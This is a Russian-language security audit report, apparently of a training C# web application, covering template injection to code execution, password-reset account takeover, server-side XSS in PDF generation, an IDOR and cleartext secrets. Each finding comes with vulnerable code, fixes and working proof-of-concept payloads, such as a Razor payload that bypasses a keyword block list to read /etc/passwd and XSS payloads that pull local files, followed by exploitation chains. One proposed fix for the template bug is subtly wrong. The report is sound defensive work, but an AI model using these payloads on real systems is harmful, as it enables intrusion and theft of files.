# Содержание
- [Содержание](#Содержание)
- [Введение](#Введение)
- [Технические детали](#ㅤ)
- [Цепочки эксплуатации](#ㅤㅤ)
# Введение
В процессе аудита предстояло рассмотреть следующие файлы:
- `Controllers/`
	- `EmailController.cs`
	- `UserController.cs`
	- `GeneratePdfReportController.cs`
	- `events.lst`
- `Services/`
	- `TemplateService.cs`

Были обнаружены следующие уязвимости:

| Critical | High | Medium | Low |
| -------- | ---- | ------ | --- |
| 0        | 3    | 2      | 0   |

| Уязвимость                                                   | Критичность |
| ------------------------------------------------------------ | ----------- |
| F-H-1. RCE через SSTI при отправке платежного листа по почте | High        |
| F-H-2. Захват аккаунта через сброс пароля                    | High        |
| F-H-3. XSS на стороне сервера через механизм генерации PDF   | High        |
| F-M-4. Получение информации о других пользователях (IDOR)    | Medium      |
| F-M-5. Хранение секретов в небезопасном месте                | Medium      |
###### ㅤ
# Технические детали

## F-H-1. RCE через SSTI при отправке платежного листа по почте (High)
### Классификация
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
- OWASP: A05:2025 Injection
### Описание
Некорректная реализация очистки пользовательского ввода при создании платежного листа через `/api/email/payslip` приводит к внедрение шаблонов на стороне сервера, что ведет к удаленному выполнению кода.
### Ограничения
Для реализации уязвимости злоумышленник должен обладать API-ключом администратора.
### Риск
- Удаленное выполнение кода (RCE)
- Захват ресурса при компрометации API-ключа администратора злоумышленником 
### Затронутая область
Конечная точка: `/api/email/payslip` (POST)
Файлы: `TemplateService.cs` (класс `TemplateService`, функция `Sanitize`), `EmailController.cs` (класс `EmailController`, функция `SendPayslip`).
Код:
```cs
// TemplateService.cs
using RazorLight;

public class TemplateService
{
    private RazorLightEngine engine;

    private static readonly string[] blockedKeywords = {"system", "process", "diagnostics", "reflection", "file", "directory", "typeof", "activator"};

	// [...]

    private string Sanitize(string template)
    {
        if (string.IsNullOrEmpty(template))
            return template;

        string normalized = template.ToLower();
		
		/*
		Некорректно реализованные проверки на наличие блоков кода. В случае с блоками кода не учитываются другие варианты, а в случае inline-кода просто реализована неправильная проверка.
		Пример:
		- @if(true){1+1}
		- @(1+1)
		*/
        if (normalized.Contains("@{") || normalized.Contains("@()")) /* <--- */
            throw new Exception("Code blocks are not allowed");
		
		/*
		В проверках на черный список слов не учитывается то, что C# позволяет в коде использовать Unicode-последовательности для замены ключевых слов, что позволяет обойти фильтр.
		Пример: System -> \u0053ystem
		*/
        foreach (var word in blockedKeywords)
        {
            if (normalized.Contains(word)) /* <--- */
                throw new Exception(string.Format("Forbidden keyword detected: {0}", word));
        }

        return template;
    }

    public async Task<string> Render(string template, object model)
    {
        template = Sanitize(template);

        string key = Guid.NewGuid().ToString();

        return await engine.CompileRenderStringAsync(
            key,
            template,
            model
        );
    }
}
```

```cs
// EmailController.cs
// [...]
[ApiController]
[Route("api/email")]
public class EmailController : ControllerBase
{
    [HttpPost("payslip")]
    public async Task<IActionResult> SendPayslip([FromBody] EmailTemplateRequest req)
		// [...]
        string template =
        @"Hello, @Model.Name!
Your salary in @Model.Month is @Model.Salary!
";

        if (!string.IsNullOrWhiteSpace(req.Comment))
        {
	        /*
		    В POST-запросе передается параметр с комментарием для сообщения и конкатенируется с шаблоном выше.
	        */ 
            template += "\n" + req.Comment; /* <--- */
        }
		
		/*
		Далее шаблон отправляется в шаблонизатор TemplateService для рендеринга 
		*/
        string body = await _templates.Render(template, model); /* <--- */

        _emailService.SendEmail(user.Email, "Your payslip", body);

        return Ok(new { message = "Payslip email sent" });
    }
	// [...]
}
```
### PoC
Сделать POST-запрос на `/api/email/payslip` cо следующей полезной нагрузкой в параметре комментария (для чтения файла `/etc/passwd`):
```cs
@if (true) {
	string text = string.Empty;
	using (\u0053ystem.IO.StreamReader reader = new \u0053ystem.IO.StreamReader("/etc/passwd"))
	{
		text = await reader.ReadToEndAsync();
	}
	<p>@text</p>
}
```
В виде однострочника:
```cs
@if (true) { string text = string.Empty; using (\u0053ystem.IO.StreamReader reader = new \u0053ystem.IO.StreamReader("/etc/passwd")) { text = await reader.ReadToEndAsync(); } <p>@text</p> }
```
### Исправление
- В `EmailController.cs` переместить конкатенацию комментария `req.Comment` и `template` после рендеринга шаблона, чтобы отсечь возможность рендеринга вредоносного кода:
	```cs
	// EmailController.cs
	// [...]
	[ApiController]
	[Route("api/email")]
	public class EmailController : ControllerBase
	{
	    [HttpPost("payslip")]
	    public async Task<IActionResult> SendPayslip([FromBody] EmailTemplateRequest req)
			// [...]
	        string template =
	        @"Hello, @Model.Name!
	Your salary in @Model.Month is @Model.Salary!
	";
			
			string body = await _templates.Render(template, model); /* <--- */
			/* ^^^ Поменяли строчки местами vvv */
	        if (!string.IsNullOrWhiteSpace(req.Comment))
	        {
	            template += "\n" + req.Comment; /* <--- */
	        }
	
	        _emailService.SendEmail(user.Email, "Your payslip", body);
	
	        return Ok(new { message = "Payslip email sent" });
	    }
		// [...]
	}
	```
- Заменить шаблонизаторы на интерполяцию строк, например
	```cs
	string template = "Hello, {0}! Your salary in {1} is {2}!";
	string body = string.Format(template, Model.Name, Model.Month, Model.Salary);
	if (!string.IsNullOrWhiteSpace(req.Comment))
	{
		template += "\n" + req.Comment;
	}
	```
## F-H-2. Захват аккаунта через сброс пароля (High)
### Классификация
- CWE-284: Improper Access Control
- OWASP: A01:2025 Broken Access Control
### Описание
Из-за неправильной реализации механизма сброса пароля любой пользователь может запросить токен сброса для своего аккаунта, а затем использовать его для смены пароля на другом аккаунте, зная почту жертвы. 
### Риск
- Захват аккаунта
- Комбинация с другими уязвимостями (см. цепочку эксплуатации) 
### Затронутая область
Конечная точка: `/api/user/password/reset` (POST).
Файлы: `UserController.cs`  (класс `UserController`, функция `Reset`).
Код:
```cs
[ApiController]
[Route("api/user")]
public class UserController : ControllerBase
{
	// [...]
    [HttpPost("password/reset")]
    public IActionResult Reset([FromBody] ResetPasswordModel req)
    {
		/*
		Поиск аккаунта для сброса по токену сброса.
		*/
        var resetToken = _db.Users.FirstOrDefault(x => x.ResetToken == req.Token); /* <--- */

        if (resetToken == null)
            return BadRequest("Invalid token");
		
		/*
		Получение аккаунта по почте, которая уже фактически будет использоваться для сброса.
		То есть, не происходит проверки, что токен сброса принадлежит именно этому аккаунту.
		*/
        var account = _db.Users.FirstOrDefault(x => x.Email == req.Email); /* <--- */

        if (account == null)
            return BadRequest("User not found");

		// [...смена пароля для account...]

        account.ResetToken = null;

        _db.SaveChanges();

        return Ok("Password updated");
    }
}
```
### PoC
- `victim@mail.test` - почта жертвы.
- `hunter@mail.test` - почта злоумышленника.
1) Запросить токен сброса для своего аккаунта:
   Сделать POST-запрос на `/api/user/password/reset` с указанием почты `hunter@mail.test` в теле запроса.
2) Получить токен
3) Зная почту жертвы и полученный токен сменить пароль:
   Сделать POST-запрос на `/api/user/password/reset` с указанием почты `victim@mail.test`, полученного токена и нового пароля в теле запроса.
### Исправление
Достаточно вместо двух переменных `resetToken` и `account` использовать одну, которая будет сочетать условия наличия токена сброса и почты одновременно:
```cs
var account = _db.Users.FirstOrDefault(x => (x.ResetToken == req.Token) && (x.Email == req.Email));

if (account == null)
    return BadRequest("User not found or invalid token.");
```
## F-H-3. XSS на стороне сервера через механизм генерации PDF (High)
### Классификация
- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- OWASP: A05:2025 Injection
- OWASP: A01:2025 Broken Access Control
### Описание
Некорректная обработка пользовательского ввода и неправильная конфигурация при генерации PDF приводит к возможности выполнения произвольных JS-скриптов (XSS) и эксплуатации уязвимостей SSRF и LFI.
### Ограничения
Для эксплуатации злоумышленник должен иметь роль пользователя (`user`).
### Риск
- Включение локальных, конфиденциальных файлов в вывод запроса
- Перебор директорий
- SSRF
- Комбинация с другими уязвимостями (см. цепочку эксплуатации) 
### Затронутая область
Конечная точка: `/PdfGenerator` (POST)
Файлы: `GeneratePdfReportController.cs` (класс `PdfGeneratorController`, функции `GeneratePdf`, `SanitizeHtml`)
Код:
```cs
// PdfGeneratorController.GeneratePdf [инициализация браузера]
// [...]
[ApiController]
[Route("[controller]")]
[Authorize(Roles = "user")]
public class PdfGeneratorController : ControllerBase
{
    private const string EventsListFile = "events.lst";

    [HttpPost]
    public async Task<IActionResult> GeneratePdf() /* <--- */
    {
		// [...]

        /*
		Небезопасные настройки запуска браузера через Puppeteer:
		"--no-sandbox" - запуск браузера происходит без механизма песочницы, 
			что позволяет получать доступ к локальным файлам.
		"--allow-file-access-from-files" - разрешается доступ к локальным 
			файлам из других локальных файлов.
        */
        await new BrowserFetcher().DownloadAsync();
        await using var browser = await Puppeteer.LaunchAsync(
            new LaunchOptions { /* <--- */
                Headless = true, 
                Args = new[] { "--no-sandbox", "--allow-file-access-from-files" }
            }
        );
		// [...]
    }
	// [...]
}
```

```cs
// PdfGeneratorController.SanitizeHtml [очистка пользовательского ввода]
// [...]
[ApiController]
[Route("[controller]")]
[Authorize(Roles = "user")]
public class PdfGeneratorController : ControllerBase
{
    private const string EventsListFile = "events.lst";

    [HttpPost]
    public async Task<IActionResult> GeneratePdf()
    {
		// [...]
        html = SanitizeHtml(html); /* <--- */
		// [...]
    }


    private static string SanitizeHtml(string html) /* <--- */
    {
		// [...]
        var sanitized = html;
        // [...]

        /*
        Список атрибутов eventAttributes (из файла events.lst) тегов для удаления содержит не все атрибуты.
        Например, нет атрибута "onerror".
        Пример обхода: <img src=x onerror=alert(1)>
        */
        var eventAttributes = LoadEventAttributes();
        foreach (var attr in eventAttributes)
        {
            var escapedAttr = Regex.Escape(attr);

            sanitized = Regex.Replace( /* <--- */
                sanitized,
                $@"\s{escapedAttr}\s*=\s*(""[^""]*""|'[^']*'|[^\s>]+)",
                string.Empty,
                RegexOptions.IgnoreCase | RegexOptions.CultureInvariant
            );
        }
		// [...]
        return sanitized;
    }
	// [...]
}
```
### PoC
Отправить POST-запрос на `/PdfGenerator` с необходимой полезной нагрузкой в теле.
- Для внедрения файла:
	```html
	<!-- вставка закодированного тега embed -->
	<img src=x onerror="document.body.innerHTML=atob('PGVtYmVkIHNyYz0i')+'<TARGET-FILE-PATH>'+atob('Ij4=')">
	<!-- или -->
	<img src=x onerror="document.location='<TARGET-FILE-PATH>'">
	```
- Для просмотра файлов в директории:
	```html
	<img src=x onerror="document.location='<TARGET-FILE-PATH>'">
	```
### Исправление
- Настройка конфигурации, например:
```js
await using var browser = await Puppeteer.LaunchAsync(
	new LaunchOptions {
		Headless = true, 
		Args = new[] {
			// убрать атрибуты --no-sandbox и --allow-file-access-from-files
			"--disable-local-file-access", // запрет доступа к file://
			"--disable-setuid-sandbox", // запуск песочницы без root-прав
		}
	}
);

await using var page = await browser.NewPageAsync();
await page.SetJavaScriptEnabledAsync(false); // для предотвращения XSS-атак
```
- Для очистки HTML использовать проверенные библиотеки, например **Ganss.HtmlSanitizer**
- Для защиты от SSRF использовать интерцепторы:
	```cs
	await page.SetRequestInterceptionAsync(true);
	// [...работа с запросом...]
	```
## F-M-4. Получение информации о других пользователях (IDOR) (Medium)
### Классификация
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP: A01:2025 Broken Access Control
### Описание
Из-за неправильной обработки пользовательского ввода в `/api/user?userId=XXX` злоумышленник может получить информацию (ID и Email) всех пользователей сервиса.
Кроме того, неправильный контроль доступа позволяет анонимному пользователю 
### Риск
- Нарушение конфиденциальности
- Перечисление пользователей (разведка)
### Затронутая область
Конечная точка: `/api/user?userId=XXX` (GET)
Файлы: `UserController.cs` (класс `UserController`, функция `GetUserInfo`)
Код:
```cs
[ApiController]
[Route("api/user")]
public class UserController : ControllerBase
{
    // [...]

    [HttpGet]
    public async Task<IActionResult> GetUserInfo([FromQuery] string? userId, CancellationToken cancellationToken)
    {
        int? currentUserId = _currentUserService.GetCurrentUserId(HttpContext) is int id ? id : null;
        if (!Request.Query.ContainsKey("userId"))
        {
            return BadRequest(new { error = "Missing required parameter: userId" });
        }
        string whereClause = string.Empty; /* <--- */

        /*
        Если передано пустое значение userId, то проверки ввода пропускаются и переменная whereClause остается пустой.
        */
        if (!string.IsNullOrWhiteSpace(userId)) /* <--- */
        {   
            if (!int.TryParse(userId, out var requestedUserId))
            {
                return BadRequest(new { error = "Parameter userId must be a valid integer" });
            }
            if (currentUserId == null || requestedUserId != currentUserId.Value)
            {
                return Forbid();
            }
            whereClause = $"WHERE u.Id = {userId}";
        }
		
		/*
		В следствии чего получаем следующий SQL-запрос:
		SELECT u.Id, u.Email, u.PasswordHash, u.ResetToken FROM Users u
		*/
        string sql = $@"
SELECT u.Id, u.Email, u.PasswordHash, u.ResetToken
FROM Users u {whereClause};"; /* <--- */
        var users = await _db.Users
            .FromSqlRaw(sql)
            .AsNoTracking()
            .ToListAsync(cancellationToken);

        var body = users.Select(userEntity => new UserInfoResponse
        {
            Id = userEntity.Id,
            Email = userEntity.Email
        }).ToList();
        return Ok(body);
    }
	// [...]
}

```
### PoC
Необходимо отправить GET-запрос на `/api/user?userId=`.
### Исправление
- Добавить блок `else`, который исключает использование пустого ввода:
	```cs
	if (!string.IsNullOrWhiteSpace(userId))
	{   
		// [...]
	}
	else
	{
		return BadRequest(new { error = "..." });
	}
	```
- Добавить `[Authorize(Roles = "user")]` перед классом
## F-M-5. Хранение секретов в небезопасном месте (Medium)
### Классификация
- CWE-312: Cleartext Storage of Sensitive Information
- OWASP: A06:2025 Insecure Design
### Описание
Допускается хранение API-ключ администратора в файле текстового формата и переменной окружения.
### Риск
- При наличии доступа к файлам пользователь может украсть API-ключ администратора.
- Комбинация с другими уязвимостями (см. цепочку эксплуатации).
### Затронутая область
Переменная окружения `ADMIN_API_KEY_PATH`, файл `/etc/app/secrets/admin_api_key.txt`.
### Исправление
- Избегать использования файлов для хранения секретов.
###### ㅤㅤ
# Цепочки эксплуатации
## Захват аккаунта
1) Анонимный пользователь эксплуатирует IDOR (F-M-4), чтобы получить список email-адресов.
2) Анонимный пользователь эксплуатирует захват аккаунта (F-H-2) на email обычного пользователя или администратор.
## RCE через аккаунт администратор
1) Разведка ресурсов сайта с правами администратора с целью найти API-ключ
   *(например, в каком-нибудь дашборде или в настройках)*
2) Использование SSTI (F-H-1) для эксплуатации RCE
## RCE через LFI через аккаунт пользователя
1) Использование серверной XSS (F-H-3) для поиска файлов, в которых может содержаться API-ключ администратора
   *(файл в котором хранятся переменные окружения, файл `/etc/app/secrets/admin_api_key.txt`).*
2) Использование SSTI (F-H-1) для эксплуатации RCE